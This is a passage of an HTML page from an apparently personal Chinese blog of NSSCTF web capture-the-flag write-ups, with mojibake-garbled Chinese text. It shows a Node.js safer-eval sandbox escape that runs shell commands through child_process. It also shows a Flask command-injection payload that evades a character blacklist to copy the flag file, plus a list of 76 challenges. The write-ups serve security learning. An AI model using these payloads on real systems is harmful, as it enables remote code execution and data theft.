function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2020.1/WORKER2 è€æ¿è¯´ä¸ºäº†åæœŸæ–¹ä¾¿ä¼˜åŒ–</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">path</span> === <span class="string">&#x27;/eval&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(delay);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Number</span>.<span class="title function_">isInteger</span>(<span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">delay</span>))) &#123;</span><br><span class="line">      delay = <span class="title class_">Math</span>.<span class="title function_">max</span>(delay, <span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">delay</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="title function_">next</span>(), delay);</span><br><span class="line">    <span class="comment">// 2020.1/WORKER3 è€æ¿è¯´è®©æˆ‘ä¼˜åŒ–ä¸€ä¸‹é€Ÿåº¦ï¼Œæˆ‘å°±ç›´æ¥è¿™æ ·å†™äº†ï¼Œå…¶ä»–äººå†™äº†å•¥å…³æˆ‘päº‹</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(t);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;timeout&#x27;</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Timeout!&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/eval&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> response = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">e</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = <span class="title function_">saferEval</span>(req.<span class="property">body</span>.<span class="property">e</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      response = <span class="string">&#x27;Wrong Wrong Wrong!!!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="title class_">String</span>(response));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 è€æ¿å¨˜è¯´å¥¹è¦çœ‹åˆ°æˆ‘ä»¬çš„æºä»£ç ï¼Œç”¨è¡Œæ•°è®¡ç®—KPI</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/source&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./index.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.12/WORKER3 ä¸ºäº†æ–¹ä¾¿æˆ‘è‡ªå·±æŸ¥çœ‹ç‰ˆæœ¬ï¼ŒåŠ ä¸Šè¿™ä¸ªæ¥å£</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/version&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/json;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./package.json&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./index.html&#x27;</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>åœ¨&#x2F;evalè·¯ç”±ä¸‹å­˜åœ¨safeevalçš„rceï¼Œä½†æ˜¯if (req.path &#x3D;&#x3D;&#x3D; â€˜&#x2F;evalâ€™) {ï¼Œæ­¤å¤„å­˜åœ¨å¤§æ—¶é—´çš„å»¶è¿Ÿï¼Œç„¶è€Œä»–æ˜¯è€ƒsetTimeoutæ¥è¿›è¡Œçš„ï¼Œå¯ä»¥é€šè¿‡</p>
<p>å¤§äº2147483647çš„æ•°æ¥ç»•è¿‡ã€‚</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105160338220.png" alt="image-20250105160338220"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e=(function () &#123;</span><br><span class="line"></span><br><span class="line">const process = clearImmediate.constructor(&#x27;return process;&#x27;)();</span><br><span class="line"></span><br><span class="line">return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;ls /&#x27;).toString()&#125;)()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;970473a7-7ad6-4826-9a42-492ec0dcf96a&#125;</span><br></pre></td></tr></table></figure>





<h2 id="NSSRound-V-Team-PYRCE"><a href="#NSSRound-V-Team-PYRCE" class="headerlink" title="[NSSRound#V Team]PYRCE"></a>[NSSRound#V Team]PYRCE</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response </span><br><span class="line"><span class="keyword">import</span> uuid </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="comment"># flag in /flag </span></span><br><span class="line">app = Flask(__name__) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>): </span><br><span class="line">	black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n`~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span> </span><br><span class="line">	<span class="keyword">for</span> black <span class="keyword">in</span> black_list: </span><br><span class="line">		<span class="keyword">if</span> black <span class="keyword">in</span> rce: </span><br><span class="line">			<span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line">	<span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line">	<span class="keyword">if</span> request.args.get(<span class="string">&quot;Å‡Å›Å›&quot;</span>): </span><br><span class="line">		nss = request.args.get(<span class="string">&quot;Å‡Å›Å›&quot;</span>) </span><br><span class="line">		<span class="keyword">if</span> waf(nss): </span><br><span class="line">			os.popen(nss) </span><br><span class="line">		<span class="keyword">else</span>: </span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;waf&quot;</span> </span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;/source&quot;</span> </span><br><span class="line">	</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>(): </span><br><span class="line">src = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read() </span><br><span class="line"><span class="keyword">return</span> src </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">	app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8080</span>) </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Å‡Å›Å›=cp $(cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;echo $(pwd)flag) app.py</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Å‡Å›Å›=cp%09%24%28cd%09..%26%26cd%09..%26%26cd%09..%26%26cd%09..%26%26echo%09%24%28pwd%29flag%29%09app.py</span><br></pre></td></tr></table></figure>


  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About me</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/categories/">categories</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPU-2018-SimplePHP"><span class="toc-number">1.</span> <span class="toc-text">[SWPU 2018]SimplePHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Double-Secret"><span class="toc-number">2.</span> <span class="toc-text">[CISCN 2019åä¸œå—]Double Secret</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TQLCTF-2022-simple-bypass"><span class="toc-number">3.</span> <span class="toc-text">[TQLCTF 2022]simple_bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">4.</span> <span class="toc-text">[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-number">5.</span> <span class="toc-text">[BJDCTF 2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-hardsql"><span class="toc-number">6.</span> <span class="toc-text">[NISACTF 2022]hardsql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#October-2019-Twice-SQL-Injection"><span class="toc-number">7.</span> <span class="toc-text">[October 2019]Twice SQL Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%B9%8F%E5%9F%8E%E6%9D%AF-2022-%E7%AE%80%E5%8D%95%E7%9A%84php"><span class="toc-number">8.</span> <span class="toc-text">[é¹åŸæ¯ 2022]ç®€å•çš„php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-middlerce"><span class="toc-number">9.</span> <span class="toc-text">[NISACTF 2022]middlerce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2023-%E5%8D%8E%E5%8C%97-ez-date"><span class="toc-number">10.</span> <span class="toc-text">[CISCN 2023 ååŒ—]ez_date</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-babyupload"><span class="toc-number">11.</span> <span class="toc-text">[NISACTF 2022]babyupload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSAWQual-2019-Unagi"><span class="toc-number">12.</span> <span class="toc-text">[CSAWQual 2019]Unagi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E5%8C%97Day2-Web1"><span class="toc-number">13.</span> <span class="toc-text">[CISCN 2019ååŒ—Day2]Web1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Web11"><span class="toc-number">14.</span> <span class="toc-text">[CISCN 2019åä¸œå—]Web11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FSCTF-2023-%E6%98%AF%E5%85%84%E5%BC%9F%EF%BC%8C%E5%B0%B1%E6%9D%A5%E4%BC%A0%E4%BD%A0%E3%81%AE%F0%9F%90%8E%EF%BC%81"><span class="toc-number">15.</span> <span class="toc-text">[FSCTF 2023]æ˜¯å…„å¼Ÿï¼Œå°±æ¥ä¼ ä½ ã®ğŸï¼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-13-Basic-flask-jwt"><span class="toc-number">16.</span> <span class="toc-text">[NSSRound#13 Basic]flask?jwt?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GKCTF-2020-CheckIN"><span class="toc-number">17.</span> <span class="toc-text">[GKCTF 2020]CheckIN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF-2018-Easy-Audit"><span class="toc-number">18.</span> <span class="toc-text">[NCTF 2018]Easy_Audit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-1-Basic-basic-check"><span class="toc-number">19.</span> <span class="toc-text">[NSSRound#1 Basic]basic_check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GDOUCTF-2023-hate-eat-snake"><span class="toc-number">20.</span> <span class="toc-text">[GDOUCTF 2023]hate eat snake</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF-2018-Flask-PLUS"><span class="toc-number">21.</span> <span class="toc-text">[NCTF 2018]Flask PLUS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-level-up"><span class="toc-number">22.</span> <span class="toc-text">[NISACTF 2022]level-up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-Calculate"><span class="toc-number">23.</span> <span class="toc-text">[HUBUCTF 2022 æ–°ç”Ÿèµ›]Calculate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FSCTF-2023-CanCanNeed"><span class="toc-number">24.</span> <span class="toc-text">[FSCTF 2023]CanCanNeed</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B9%96%E6%B9%98%E6%9D%AF-2021-final-Penetratable"><span class="toc-number">25.</span> <span class="toc-text">[æ¹–æ¹˜æ¯ 2021 final]Penetratable</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2022-%E5%88%9D%E8%B5%9B-ezpop"><span class="toc-number">26.</span> <span class="toc-text">[CISCN 2022 åˆèµ›]ezpop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSCTF-2022-Spring-Recruit-babysql"><span class="toc-number">27.</span> <span class="toc-text">[NSSCTF 2022 Spring Recruit]babysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HDCTF-2023-YamiYami"><span class="toc-number">28.</span> <span class="toc-text">[HDCTF 2023]YamiYami</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-babyunser"><span class="toc-number">29.</span> <span class="toc-text">[SWPUCTF 2021 æ–°ç”Ÿèµ›]babyunser</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-WEEK3-ssssti"><span class="toc-number">30.</span> <span class="toc-text">[HNCTF 2022 WEEK3]ssssti</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GFCTF-2021-Baby-Web"><span class="toc-number">31.</span> <span class="toc-text">[GFCTF 2021]Baby_Web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easyphp"><span class="toc-number">32.</span> <span class="toc-text">[ç¾ŠåŸæ¯ 2020]easyphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SCTF-2021-loginme"><span class="toc-number">33.</span> <span class="toc-text">[SCTF 2021]loginme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96"><span class="toc-number">34.</span> <span class="toc-text">[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce-3"><span class="toc-number">35.</span> <span class="toc-text">[SWPUCTF 2021 æ–°ç”Ÿèµ›]hardrce_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B9%BF%E4%B8%9C%E5%BC%BA%E7%BD%91%E6%9D%AF-2021-%E5%9B%A2%E9%98%9F%E7%BB%84-love-Pokemon"><span class="toc-number">36.</span> <span class="toc-text">[å¹¿ä¸œå¼ºç½‘æ¯ 2021 å›¢é˜Ÿç»„]love_Pokemon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-2022-Node-Magical-Login"><span class="toc-number">37.</span> <span class="toc-text">[è¥¿æ¹–è®ºå‰‘ 2022]Node Magical Login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-2022-real-ez-node"><span class="toc-number">38.</span> <span class="toc-text">[è¥¿æ¹–è®ºå‰‘ 2022]real_ez_node</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ezpop"><span class="toc-number">39.</span> <span class="toc-text">[UUCTF 2022 æ–°ç”Ÿèµ›]ezpop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LitCTF-2023-Http-pro-max-plus"><span class="toc-number">40.</span> <span class="toc-text">[LitCTF 2023]Http pro max plus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AFCTF-2021-BABY-CSP"><span class="toc-number">41.</span> <span class="toc-text">[AFCTF 2021]BABY_CSP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-greatphp"><span class="toc-number">42.</span> <span class="toc-text">[æå®¢å¤§æŒ‘æˆ˜ 2020]greatphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-1-Basic-sql-by-sql"><span class="toc-number">43.</span> <span class="toc-text">[NSSRound#1 Basic]sql_by_sql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GFCTF-2021-ez-calc"><span class="toc-number">44.</span> <span class="toc-text">[GFCTF 2021]ez_calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E5%8C%97Day1-Web1"><span class="toc-number">45.</span> <span class="toc-text">[CISCN 2019ååŒ—Day1]Web1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MoeCTF-2021-%E5%9C%B0%E7%8B%B1%E9%80%9A%E8%AE%AF"><span class="toc-number">46.</span> <span class="toc-text">[MoeCTF 2021]åœ°ç‹±é€šè®¯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E5%8C%97Day1-Web2"><span class="toc-number">47.</span> <span class="toc-text">[CISCN 2019ååŒ—Day1]Web2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-Power"><span class="toc-number">48.</span> <span class="toc-text">[SWPUCTF 2022 æ–°ç”Ÿèµ›]Power!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ISITDTU-2019-EasyPHP"><span class="toc-number">49.</span> <span class="toc-text">[ISITDTU 2019]EasyPHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php"><span class="toc-number">50.</span> <span class="toc-text">[å®‰æ´µæ¯ 2019]easy_serialize_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="toc-number">51.</span> <span class="toc-text">[æŠ¤ç½‘æ¯ 2018]easy_tornado</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2020-Cookie-is-so-subtle"><span class="toc-number">52.</span> <span class="toc-text">[BJDCTF 2020]Cookie is so subtle!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-8-Basic-Upload-gogoggo"><span class="toc-number">53.</span> <span class="toc-text">[NSSRound#8 Basic]Upload_gogoggo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MoeCTF-2021-fake-game"><span class="toc-number">54.</span> <span class="toc-text">[MoeCTF 2021]fake game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-13-Basic-ez-factors"><span class="toc-number">55.</span> <span class="toc-text">[NSSRound#13 Basic]ez_factors</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-4-SWPU-1zweb-revenge"><span class="toc-number">56.</span> <span class="toc-text">[NSSRound#4 SWPU]1zweb(revenge)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Web4"><span class="toc-number">57.</span> <span class="toc-text">[CISCN 2019åä¸œå—]Web4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2"><span class="toc-number">58.</span> <span class="toc-text">[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#prize-p2"><span class="toc-number">59.</span> <span class="toc-text">prize_p2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSCTF-2nd-MyHurricane"><span class="toc-number">60.</span> <span class="toc-text">[NSSCTF 2nd]MyHurricane</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-EasyCleanup"><span class="toc-number">61.</span> <span class="toc-text">[ç¬¬äº”ç©ºé—´ 2021]EasyCleanup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HZNUCTF-2023-final-eznode"><span class="toc-number">62.</span> <span class="toc-text">[HZNUCTF 2023 final]eznode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%B9%A4%E5%9F%8E%E6%9D%AF-2021-EasyP"><span class="toc-number">63.</span> <span class="toc-text">[é¹¤åŸæ¯ 2021]EasyP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FSCTF-2023-%E7%AD%BE%E5%88%B0plus"><span class="toc-number">64.</span> <span class="toc-text">[FSCTF 2023]ç­¾åˆ°plus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2022-%E5%88%9D%E8%B5%9B-online-crt"><span class="toc-number">65.</span> <span class="toc-text">[CISCN 2022 åˆèµ›]online_crt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-PNG%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E5%99%A8"><span class="toc-number">66.</span> <span class="toc-text">[ç¬¬äº”ç©ºé—´ 2021]PNGå›¾ç‰‡è½¬æ¢å™¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GHCTF-2024-%E6%96%B0%E7%94%9F%E8%B5%9B-ezzz-unserialize"><span class="toc-number">67.</span> <span class="toc-text">[GHCTF 2024 æ–°ç”Ÿèµ›]ezzz_unserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-4-SWPU-ez-rce"><span class="toc-number">68.</span> <span class="toc-text">[NSSRound#4 SWPU]ez_rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASIS-2019-Unicorn-shop"><span class="toc-number">69.</span> <span class="toc-text">[ASIS 2019]Unicorn shop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-17-Basic-%E7%9C%9F%C2%B7%E7%AD%BE%E5%88%B0"><span class="toc-number">70.</span> <span class="toc-text">[NSSRound#17 Basic]çœŸÂ·ç­¾åˆ°</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-16-Basic-%E4%BA%86%E8%A7%A3%E8%BF%87PHP%E7%89%B9%E6%80%A7%E5%90%97"><span class="toc-number">71.</span> <span class="toc-text">[NSSRound#16 Basic]äº†è§£è¿‡PHPç‰¹æ€§å—</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPU-2016-web400"><span class="toc-number">72.</span> <span class="toc-text">[SWPU 2016]web400</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#De1ctf-2019-SSRF-Me"><span class="toc-number">73.</span> <span class="toc-text">[De1ctf 2019]SSRF Me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#prize-p4"><span class="toc-number">74.</span> <span class="toc-text">prize_p4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GKCTF-2020-ez%E4%B8%89%E5%89%91%E5%AE%A2-easynode"><span class="toc-number">75.</span> <span class="toc-text">[GKCTF 2020]ezä¸‰å‰‘å®¢-easynode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-V-Team-PYRCE"><span class="toc-number">76.</span> <span class="toc-text">[NSSRound#V Team]PYRCE</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&text=NSS-webåˆ·é¢˜"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&title=NSS-webåˆ·é¢˜"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&is_video=false&description=NSS-webåˆ·é¢˜"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=NSS-webåˆ·é¢˜&body=Check out this article: http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
